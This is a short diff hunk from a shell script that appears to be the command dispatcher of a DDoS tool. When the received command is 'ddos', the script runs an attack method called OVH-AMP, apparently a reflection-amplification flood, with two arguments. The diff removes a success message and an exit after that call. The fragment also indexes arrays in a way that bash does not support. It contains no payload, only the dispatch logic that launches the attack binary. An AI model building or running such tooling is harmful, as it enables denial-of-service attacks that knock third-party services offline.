@@ -57,8 +57,6 @@ if [[ -f "./installed" ]]; then
         if [ "$cmdtorun" == "ddos" ]; then
 
             ~/root/methods/OVH-AMP $cmdtorun[1] $cmdtorun[2]
-            echo "✓ Success."
-            exit
         
         fi
         
